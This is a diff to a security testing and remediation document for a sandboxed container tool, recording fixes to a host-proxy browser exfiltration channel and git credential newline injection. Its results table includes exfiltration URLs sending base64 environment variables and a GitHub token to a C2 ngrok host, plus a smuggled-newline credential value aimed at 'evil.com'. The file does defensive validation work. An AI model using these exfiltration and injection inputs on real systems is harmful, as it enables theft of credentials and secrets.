@@ -114,17 +114,49 @@ docker exec clawker-test-attacker wget -qO- --no-check-certificate \
 - Can data escape via UDP or ICMP (firewall only redirects TCP)?
 - Can DNS label encoding bypass CoreDNS filtering?
 
-### Host Proxy (no authentication)
-- `POST /git/credential` — credential extraction for arbitrary git hosts
-- `POST /open/url` — open URLs in host browser
+### Host Proxy
+- `POST /open/url` — exfil via host browser (see Remediation below)
+- `POST /git/credential` — newline injection in protocol fields (see Remediation below)
 - `POST /callback/register` — bind arbitrary ports on host loopback
-- Newline injection in git credential protocol fields
 
 ### Container Sandbox
 - Docker socket access
 - Bind mount traversal
 - Socket bridge (SSH/GPG agent) abuse
 - Environment variable leakage
+
+## Remediation: Host Proxy Egress Control (2026-04-04)
+
+**Branch:** `fix/hostproxy-egress`
+
+The `/open/url` exfil chain was the most critical finding — it bypassed the entire Envoy+CoreDNS firewall by leveraging the host browser as an out-of-band channel. Fixed in Tasks 1-4 of the hostproxy egress control initiative.
+
+### What was fixed
+
+1. **`/open/url` egress enforcement** — Before opening a URL in the host browser, the hostproxy now reads `egress-rules.yaml` (same rules the firewall uses) and checks if the target domain+proto+port is allowed. Blocked requests return 403. Rules are read just-in-time on every request with flock for consistency.
+
+2. **Git credential newline injection** — `POST /git/credential` now rejects requests containing `\n`, `\r`, or `\0` in any credential field (400 response). Defense-in-depth sanitization also applied in `formatGitCredentialInput`.
+
+### Adversarial validation results (2026-04-04)
+
+C2 server: `ajschmitt.ngrok.app` (ngrok tunnel to local attacker-server)
+
+| Test | Attack vector | Result |
+|------|--------------|--------|
+| Exfil env vars via ngrok `/open/url` | `https://ajschmitt.ngrok.app/c/16?c=<base64>` | **BLOCKED** — `blocked by egress policy` |
+| Exfil GH_TOKEN via ngrok `/open/url` | `https://ajschmitt.ngrok.app/c/16?c=<base64>` | **BLOCKED** |
+| Exfil via localhost:8080 HTTP | `http://localhost:8080/c/01?d=<base64>` | **BLOCKED** |
+| Exfil via localhost:8443 HTTPS | `https://localhost:8443/c/01?d=<base64>` | **BLOCKED** |
+| Legitimate URL (github.com) | `https://github.com/schmitthub/clawker` | **ALLOWED** |
+| Git credential newline injection | `host: "evil.com\nusername=victim"` | **REJECTED** (400) |
+| C2 dashboard captures | — | **0 captures** (confirmed by operator) |
+
+### Remaining attack surfaces (not yet addressed)
+
+- `POST /callback/register` — can bind arbitrary ports on host loopback (OAuth flow)
+- Socket bridge (SSH/GPG agent) abuse potential
+- Environment variable leakage (secrets visible in container env)
+- UDP/ICMP exfil (firewall only redirects TCP through Envoy)
 
 ## Payloads
 
